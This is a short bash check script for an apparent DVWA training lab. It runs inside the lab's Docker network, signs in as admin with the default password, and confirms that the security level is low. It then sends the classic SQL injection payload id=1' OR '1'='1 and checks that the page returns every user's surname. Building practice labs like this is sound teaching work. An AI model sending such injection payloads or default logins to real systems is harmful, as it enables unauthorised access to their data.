#!/usr/bin/env bash
# What the README promises, checked from inside the lab's own network: run by check.sh.
set -euo pipefail
: "${NET:?run through test/check.sh}"
probe() { docker run --rm --network "$NET" lab-check-probe bash -c "$1"; }
echo "- the database was made for us and admin signs in at the low level"
probe '
set -eu
j=/tmp/j; B=http://dvwa
tok=$(curl -fs -c $j -b $j $B/login.php | sed -n "s/.*name=.user_token. value=.\([a-f0-9]*\).*/\1/p")
code=$(curl -s -o /dev/null -w "%{http_code}" -c $j -b $j -d "username=admin&password=password&Login=Login&user_token=$tok" $B/login.php)
[ "$code" = 302 ] || { echo "sign in answered $code, expected 302" >&2; exit 1; }
grep -q "security.low" $j || { echo "the security level is not low" >&2; exit 1; }
echo "- one injected id returns every user, the classic SQL injection"
out=$(curl -fs -b $j "$B/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit" | grep -o "Surname: [A-Za-z]*" | sort -u)
for s in admin Brown Me Picasso Smith; do
  echo "$out" | grep -qx "Surname: $s" || { echo "missing Surname: $s in: $out" >&2; exit 1; }
done
'
echo "  ok"
